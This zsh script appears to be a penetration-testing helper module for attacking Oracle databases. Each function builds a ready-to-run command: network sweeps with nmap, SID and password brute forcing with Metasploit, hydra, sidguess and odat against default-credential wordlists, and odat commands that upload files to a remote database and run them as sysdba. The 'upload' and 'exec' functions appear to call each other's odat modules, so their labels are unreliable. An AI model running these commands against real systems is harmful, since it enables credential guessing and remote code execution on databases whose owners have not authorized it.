#!/usr/bin/env zsh

############################################################# 
# nb-enum-oracle
#############################################################
nb-enum-oracle-help() {
    cat << "DOC" | bat --plain --language=help

nb-enum-oracle
--------------
The nb-enum-oracle namespace contains commands for scanning and enumerating Oracle services and databases.

Sid brute force
-----------------
nb-enum-oracle-sidguess          tnscmd password brute force
nb-enum-oracle-msf-sid           brute force sids with metasploit
nb-enum-oracle-odat-sidguess     brute force sids with odat sidguess
nb-enum-oracle-hydra-sid         brute force passwords

ODAT
----
nb-enum-oracle-odat              odat anonymous enumeration
nb-enum-oracle-odat-upload       odat 
nb-enum-oracle-odat-exec         odat 
nb-enum-oracle-odat-creds        odat authenticated enumeration
nb-enum-oracle-odat-passwords    odat password brute

Commands
--------
nb-enum-oracle-install           installs dependencies
nb-enum-oracle-nmap-sweep        scan a network for services
nb-enum-oracle-tcpdump           capture traffic to and from a host
nb-enum-oracle-sqlplus           sqlplus client
nb-enum-oracle-version           tnscmd version query
nb-enum-oracle-status            tnscmd status query
nb-enum-oracle-oscanner          oscanner enumeration
nb-enum-oracle-hydra-listener    brute force passwords 

DOC
}

nb-enum-oracle-msf-sid() {
    __check-project
    nb-vars-set-rhost
    local cmd="use scanner/oracle/sid_brute; set RHOST ${__RHOST}; run"
    print -z "msfconsole -n -q -x \"${cmd}\""
}

nb-enum-oracle-odat-sidguess() {
    __check-project
    nb-vars-set-rhost
    print -z "odat sidguesser -s ${__RHOST} -p 1521"
}

nb-enum-oracle-odat-upload() {
    __check-project
    nb-vars-set-rhost
    nb-vars-set-user
    nb-vars-set-pass
    __ask "Enter file to in current working directory to upload"
    local f && __askvar f "FILE"
    print -z "./odat-libc2.17-x86_64 externaltable -s ${__RHOST} -p 1521 -U ${__USER} -P ${__PASS} -d XE --sysdba --exec /temp $f"
}

nb-enum-oracle-odat-exec() {
    __check-project
    nb-vars-set-rhost
    nb-vars-set-user
    nb-vars-set-pass
    __ask "Enter file to in current working directory to execute"
    local f && __askvar f "FILE"
    print -z "./odat-libc2.17-x86_64 utlfile -s ${__RHOST} -p 1521 -d XE -U ${__USER} -P ${__PASS} --sysdba --putFile /temp $f ./$f"
}










nb-enum-oracle-install() {
    __info "Running $0..."
    __pkgs tcpdump nmap odat tnscmd10g sidguess oscanner hydra
    __pkgs oracle-instantclient-sqlplus 
    sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf"; sudo ldconfig
}

nb-enum-oracle-nmap-sweep() {
    __check-project

    __ask "Do you want to scan a network subnet or a host? (n/h)"
    local scan && __askvar scan "SCAN_TYPE"

    if [[ $scan == "h" ]]; then
      nb-vars-set-rhost
      print -z "sudo grc nmap -v -n -Pn -sS -p 1521 ${__RHOST} -oA $(__hostpath)/oracle-sweep"
    elif [[ $scan == "n" ]]; then
      nb-vars-set-network
      print -z "sudo grc nmap -v -n -Pn -sS -p 1521 ${__NETWORK} -oA $(__netpath)/oracle-sweep"
    else
        echo
        __err "Invalid option. Please choose 'n' for network or 'h' for host."
    fi
}

nb-enum-oracle-tcpdump() {
    __check-project
    nb-vars-set-iface
    nb-vars-set-rhost
    print -z "sudo tcpdump -i ${__IFACE} host ${__RHOST} and tcp port 1521 -w $(__hostpath)/oracle.pcap"
}

nb-enum-oracle-sqlplus() {
    nb-vars-set-rhost
    nb-vars-set-user
    nb-vars-set-pass
    local sid && __askvar sid "SID(DATABASE)"
    print -z "sqlplus ${__USER}/${__PASS}@${__RHOST}:1521/${sid} as sysdba"
}

nb-enum-oracle-odat() {
    nb-vars-set-rhost
    print -z "odat all -s ${__RHOST}"
}

nb-enum-oracle-odat-creds() {
    nb-vars-set-rhost
    nb-vars-set-user
    nb-vars-set-pass
    local sid && __askvar sid "SID(DATABASE)"
    print -z "odat all -s ${__RHOST} -p 1521 -d ${sid} -U ${__USER} -P ${__PASS}"
}

nb-enum-oracle-odat-passwords() {
    nb-vars-set-rhost
    local sid && __askvar sid "SID(DATABASE)"
    __info "cat /usr/share/metasploit-framework/data/wordlists/oracle_default_userpass.txt | sed -e "s/[[:space:]]/\\\/g""
    print -z "odat passwordguesser -s ${__RHOST} -d ${sid} --accounts-file accounts.txt"
}

nb-enum-oracle-version(){
    nb-vars-set-rhost
    print -z "tnscmd10g version -h ${__RHOST}"
}

nb-enum-oracle-status(){
    nb-vars-set-rhost
    print -z "tnscmd10g status -h ${__RHOST}"
}

nb-enum-oracle-sidguess(){
    nb-vars-set-rhost
    print -z "sidguess -p 1521 -i ${__RHOST} -d /usr/share/seclists/Fuzzing/Databases/OracleDB-SID.txt"
}

nb-enum-oracle-oscanner() {
    nb-vars-set-rhost
    print -z "oscanner -s ${__RHOST}"
}

nb-enum-oracle-hydra-listener() {
    __check-project
    nb-vars-set-rhost
    __check-user
    print -z "hydra -l ${__USER} -P ${__PASSLIST} -e -o $(__hostpath)/oracle-listener-hydra-brute.txt ${__RHOST} Oracle Listener -F"
}

nb-enum-oracle-hydra-sid() {
    __check-project
    nb-vars-set-rhost
    __check-user
    print -z "hydra -l ${__USER} -P ${__PASSLIST} -e -o $(__hostpath)/oracle-sid-hydra-brute.txt ${__RHOST} Oracle Sid -F"
}
